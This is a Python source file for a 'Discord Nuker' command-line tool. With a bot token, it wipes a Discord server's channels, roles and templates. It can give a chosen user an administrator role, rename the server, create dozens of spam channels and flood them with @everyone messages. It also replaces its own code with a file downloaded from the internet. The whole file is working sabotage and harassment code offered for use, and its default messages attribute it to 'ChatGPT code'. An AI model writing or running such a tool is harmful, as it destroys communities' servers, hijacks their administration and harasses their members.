import discord
import aiohttp
import asyncio
import sys
import os
import requests

ZROX = "\033[93m"
white = "\033[97m"
red = "\033[38;5;196m"
blue = "\033[38;5;75m"
clear = "\033[0m"

VERSION = "1.0"
GITHUB_REPO = "https://raw.githubusercontent.com/kaczza/dcnuker/refs/heads/main/version.txt"

class NukeManager:
    def __init__(self):
        self.running = True

nuke_manager = NukeManager()

def check_update():
    try:
        response = requests.get(GITHUB_REPO, timeout=5)
        if response.status_code == 200:
            latest_version = response.text.strip()
            if latest_version != VERSION:
                print(f"{red}⚠️ Update available! Current: {VERSION} | Latest: {latest_version}{clear}")
                print(f"{ZROX}Run 'update' to get the latest version{clear}")
                input()
                return False
            else:
                print(f"{ZROX}✅ You have the latest version ({VERSION}){clear}")
                print(f"{red}Press enter to continue{clear}")
                input()
                return True
    except:
        print(f"{red}❌ Failed to check for updates{clear}")
        input()
        return True

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{clear} Discord {ZROX}|{clear} discord.gg/UTxb2Dk9jQ
          {ZROX}
▄▄▄▄▄▄   █▄▄▄▄ ████▄     ▄  
▀   ▄▄▀   █  ▄▀ █   █ ▀▄   █ 
 ▄▀▀   ▄▀ █▀▀▌  █   █   █ ▀  
 ▀▀▀▀▀▀   █  █  ▀████  ▄ █   
            █         █   ▀▄ 
           ▀           ▀     V{VERSION}{clear}
{blue}Discord Nuker{clear}

         Type "{ZROX}help{clear}" to the view commands
""")

async def nuke_server(token, guild_id, user_id=None, nuker_name="ChatGPT", spam_message="@everyone The whole server is trash nuked by ChatGPT code🚨"):
    nuke_manager.running = True
    
    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True
    intents.messages = True
    intents.message_content = True

    client = discord.Client(intents=intents)

    async def stop_listener():
        while nuke_manager.running:
            try:
                user_input = await asyncio.get_event_loop().run_in_executor(None, input, "")
                if user_input.lower() == 'stop':
                    nuke_manager.running = False
                    print(f'{red}🛑 Nuke process stopped by user{clear}')
                    await client.close()
                    return
            except:
                pass
            await asyncio.sleep(0.1)

    @client.event
    async def on_ready():
        print(f'{ZROX}🤖 Logged in: {client.user}{clear}')
        
        asyncio.create_task(stop_listener())

        guild = client.get_guild(int(guild_id))
        if not guild:
            print(f'{red}❌ Server not found.{clear}')
            nuke_manager.running = False
            await client.close()
            return

        try:
            print(f'{ZROX}📦 Creating server template backup...{clear}')
            try:
                templates = []
                try:
                    templates = await guild.templates()
                except:
                    pass
                
                for template in templates:
                    try:
                        await template.delete()
                        print(f'{red}🗑️ Deleted template: {template.name}{clear}')
                        await asyncio.sleep(0.5)
                    except:
                        pass
                
                try:
                    new_template = await guild.create_template(
                        name=f'Server Backup Before {nuker_name} Nuke',
                        description=f'Automated backup created before nuke by {nuker_name}'
                    )
                    print(f'{ZROX}✅ Template created: https://discord.new/{new_template.code}{clear}')
                except:
                    print(f'{red}❌ Template creation not supported{clear}')
                await asyncio.sleep(1)
            except Exception as e:
                print(f'{red}❌ Failed to create template{clear}')

            if user_id:
                print(f'{ZROX}👑 Promoting user {user_id}...{clear}')
                try:
                    member = guild.get_member(int(user_id))
                    if member:
                        admin_role = None
                        for role in guild.roles:
                            if role.permissions.administrator:
                                admin_role = role
                                break
                        
                        if not admin_role:
                            admin_role = await guild.create_role(
                                name='Your king',
                                permissions=discord.Permissions.all(),
                                color=discord.Color.gold()
                            )
                            print(f'{ZROX}✅ Created admin role{clear}')
                        
                        await member.add_roles(admin_role)
                        print(f'{ZROX}✅ Promoted user: {member.display_name}{clear}')
                    else:
                        print(f'{red}❌ User not found in server{clear}')
                    await asyncio.sleep(1)
                except Exception as e:
                    print(f'{red}❌ Failed to promote user{clear}')

            if not nuke_manager.running:
                return

            print(f'{ZROX}ℹ️ Starting server nuke...{clear}')
            await asyncio.sleep(1)

            icon_url = 'https://ichef.bbci.co.uk/images/ic/1920xn/p0fp8rd9.jpg'
            
            async with aiohttp.ClientSession() as session:
                async with session.get(icon_url) as response:
                    if response.status == 200:
                        icon_data = await response.read()
                        await guild.edit(name=f'Nuked by {nuker_name}')
                        await asyncio.sleep(1)
                        await guild.edit(icon=icon_data)
                        print(f'{ZROX}🛠️ Server name changed to: Nuked by {nuker_name}{clear}')
                    else:
                        print(f'{red}❌ Failed to download icon{clear}')
                        await guild.edit(name=f'Nuked by {nuker_name}')
                        print(f'{ZROX}🛠️ Server name changed to: Nuked by {nuker_name}{clear}')

            if not nuke_manager.running:
                return

            await asyncio.sleep(1)

            print(f'{red}🗑️ Deleting all channels...{clear}')
            for channel in list(guild.channels):
                if not nuke_manager.running:
                    break
                try:
                    await channel.delete()
                    print(f'{red}❌ Deleted: {channel.name}{clear}')
                    await asyncio.sleep(0.5)
                except Exception:
                    pass

            if not nuke_manager.running:
                return

            await asyncio.sleep(1)

            print(f'{red}🗑️ Deleting all roles...{clear}')
            for role in list(guild.roles):
                if not nuke_manager.running:
                    break
                if role.name != '@everyone' and not role.managed:
                    try:
                        await role.delete()
                        print(f'{red}❌ Role deleted: {role.name}{clear}')
                        await asyncio.sleep(0.5)
                    except Exception:
                        print(f'{red}⚠️ Failed to delete role: {role.name}{clear}')

            if not nuke_manager.running:
                return

            await asyncio.sleep(1)

            print(f'{ZROX}📝 Creating new channels...{clear}')
            created_channels = []
            for i in range(30):
                if not nuke_manager.running:
                    break
                try:
                    channel = await guild.create_text_channel(f'{nuker_name}-nuked-{i + 1}')
                    created_channels.append(channel)
                    print(f'{ZROX}✅ Channel created: {channel.name}{clear}')
                    await asyncio.sleep(0.3)
                except Exception as e:
                    print(f'{red}❌ Error creating channel{clear}')

            if not nuke_manager.running:
                return

            await asyncio.sleep(1)

            print(f'{ZROX}🎨 Creating new role...{clear}')
            new_role = await guild.create_role(name=f'{nuker_name} nuked this server', color=discord.Color.red())
            print(f'{ZROX}✅ Role created: {nuker_name} nuked this server{clear}')

            await asyncio.sleep(1)

            print(f'{ZROX}👥 Assigning role to members...{clear}')
            for member in guild.members:
                if not nuke_manager.running:
                    break
                if not member.bot:
                    try:
                        await member.add_roles(new_role)
                    except Exception:
                        pass
            print(f'{ZROX}🎖️ Role assigned to all members.{clear}')

            if not nuke_manager.running:
                return

            print(f'{red}💣 Starting message spam...{clear}')
            print(f'{ZROX}💡 Type "stop" to stop the nuke process{clear}')
            
            async def send_messages():
                message_count = 0
                while nuke_manager.running and message_count < 100: 
                    for channel in created_channels:
                        if not nuke_manager.running:
                            break
                        try:
                            await channel.send(spam_message)
                            message_count += 1
                        except Exception:
                            pass
                    await asyncio.sleep(1)
                if nuke_manager.running:
                    print(f'{ZROX}✅ Nuke completed successfully!{clear}')
                await client.close()
                os.system('cls' if os.name == 'nt' else 'clear')

            asyncio.create_task(send_messages())

        except Exception as err:
            print(f'{red}❌ Error occurred{clear}')
            nuke_manager.running = False
            await client.close()

    await client.start(token)

def get_nuke_credentials():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{clear} Discord {ZROX}|{clear} discord.gg/UTxb2Dk9jQ
          {ZROX}
▄▄▄▄▄▄   █▄▄▄▄ ████▄     ▄  
▀   ▄▄▀   █  ▄▀ █   █ ▀▄   █ 
 ▄▀▀   ▄▀ █▀▀▌  █   █   █ ▀  
 ▀▀▀▀▀▀   █  █  ▀████  ▄ █   
            █         █   ▀▄ 
           ▀           ▀     V{VERSION}{clear}
{blue}Discord Nuker{clear}
    """)
    
    token = input(f"""
╔═══[{ZROX}Bot Token{clear}]
╚══{ZROX}>{clear} """)
    
    guild_id = input(f"""
╔═══[{ZROX}Server ID{clear}]
╚══{ZROX}>{clear} """)
    
    user_id = input(f"""
╔═══[{ZROX}User ID to promote (optional){clear}]
╚══{ZROX}>{clear} """)
    
    nuker_name = input(f"""
╔═══[{ZROX}Who nuked the server?{clear}]
╚══{ZROX}>{clear} """)
    
    spam_message = input(f"""
╔═══[{ZROX}Message{clear}]
╚══{ZROX}>{clear} """)
    
    return token, guild_id, user_id if user_id.strip() else None, nuker_name if nuker_name.strip() else "ChatGPT", spam_message if spam_message.strip() else "@everyone The whole server is trash nuked by ChatGPT code🚨"

def main():
    check_update()
    while True:
        banner()
        select = input(f"""
╔═══[{ZROX}root{clear}@{ZROX}ZROX{clear}]
╚══{ZROX}>{clear} """)
                                        
        if select == "help":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"""
          {ZROX}
                    ╦ ╦╔═╗╦  ╔═╗
                    ╠═╣║╣ ║  ╠═╝
                    ╩ ╩╚═╝╩═╝╩ {clear}
                github.com/kaczza
        {ZROX}╔═════════════════════════════════╗{clear}
        {ZROX}║{clear}  {ZROX}-{clear} nuke   {ZROX}|{clear} Discord Nuke Tool   {ZROX}║{clear}         
        {ZROX}║{clear}  {ZROX}-{clear} update {ZROX}|{clear} Update ZROX         {ZROX}║{clear}
        {ZROX}╚═════════════════════════════════╝{clear}
                  """)
            input()

        elif select == "nuke":
            token, guild_id, user_id, nuker_name, spam_message = get_nuke_credentials()
            if token and guild_id:
                asyncio.run(nuke_server(token, guild_id, user_id, nuker_name, spam_message))
            input()
        elif select == "update":
            try:
                print(f"{ZROX}🔄 Checking for updates...{clear}")
                response = requests.get(GITHUB_REPO)
                if response.status_code == 200:
                    latest_version = response.text.strip()
                    if latest_version != VERSION:
                        print(f"{ZROX}📥 Update available! Downloading version {latest_version}...{clear}")
                        
                        code_url = "https://raw.githubusercontent.com/kaczza/dcnuker/main/Nuke.py"
                        code_response = requests.get(code_url)
                        
                        if code_response.status_code == 200:
                            current_file = sys.argv[0]
                            backup_file = f"zrox_backup_v{VERSION}.py"
                            
                            with open(backup_file, "w", encoding="utf-8") as f:
                                with open(current_file, "r", encoding="utf-8") as current:
                                    f.write(current.read())  
                            with open(current_file, "w", encoding="utf-8") as f:
                                lines = code_response.text.split('\n')
                                cleaned_lines = [line.rstrip() for line in lines]
                                f.write('\n'.join(cleaned_lines))
                            
                            print(f"{ZROX}✅ Update {latest_version} downloaded successfully!{clear}")
                            print(f"{ZROX}📁 Backup saved as: {backup_file}{clear}")
                            print(f"{ZROX}🔄 Restart the tool to use the new version{clear}")
                        else:
                            print(f"{red}❌ Failed to download update file{clear}")
                    else:
                        print(f"{ZROX}✅ Already on latest version ({VERSION}){clear}")
                else:
                    print(f"{red}❌ Failed to check for updates{clear}")
            except Exception as e:
                print(f"{red}❌ Update failed: {e}{clear}")
            input()

if __name__ == "__main__":
    main()
